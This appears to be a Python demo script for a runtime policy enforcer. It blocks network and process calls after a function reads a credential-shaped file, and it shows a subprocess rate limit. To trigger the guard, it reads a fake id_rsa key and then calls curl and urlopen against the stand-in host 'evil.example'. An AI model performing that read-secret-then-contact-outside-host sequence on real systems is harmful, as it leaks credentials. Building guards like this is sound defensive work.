"""Temporal Dogwood: the decision depends on what the function did before."""
import os, subprocess, tempfile
from strands_inspect import watch, PolicyViolation

# Read a credential-shaped file, then try to reach the network or spawn a process:
# the temporal forbid fires. Reading ordinary files first changes nothing.
NO_EXFIL = os.path.join(os.path.dirname(__file__), "policies", "no_exfil.dw")

fake_key = os.path.join(tempfile.mkdtemp(), "id_rsa")
open(fake_key, "w").write("-----BEGIN OPENSSH PRIVATE KEY-----\n")

@watch(policy=NO_EXFIL, dump=False)
def agent():
    subprocess.run(["true"])                     # fine: nothing sensitive read yet
    open("/etc/hosts").read()                    # ordinary read: still fine
    subprocess.run(["true"])                     # still fine
    open(fake_key).read()                        # sensitive read (basename id_*)
    try:
        subprocess.run(["curl", "https://evil.example"])   # os group: denied for 5 minutes
    except PolicyViolation as e:
        print(f"Blocked: {e}")
    try:
        import urllib.request
        urllib.request.urlopen("https://evil.example")     # net group: denied too
    except PolicyViolation as e:
        print(f"Blocked: {e}")
    return open("/etc/hosts").read()[:10]        # reads are still allowed

agent()
session = agent.__last_session__
print(f"{len(session.denied)} denied:", [(d["action"], d["rules"]) for d in session.denied])

# Rate limiting with the default macro library: at most 3 subprocesses per minute.
# subprocess.run() is seen twice (run, then the Popen it creates), so count the Popen op.
RATE = """
permit ( principal, action, resource );
@id("max-3-subprocesses-per-minute")
forbid ( principal, action == Inspect::Action::"subprocess", resource )
when temporal {
    exists (n: Long). (
        (count_within(1m, Inspect::Action::"subprocess"::request{ input.op: "subprocess.Popen" })) == n
        && n > 3
    )
};
"""

@watch(policy=RATE, dump=False, print_summary=False)
def chatty():
    ok = 0
    for _ in range(6):
        try:
            subprocess.run(["true"]); ok += 1
        except PolicyViolation:
            pass
    return ok

print("subprocesses that ran:", chatty())
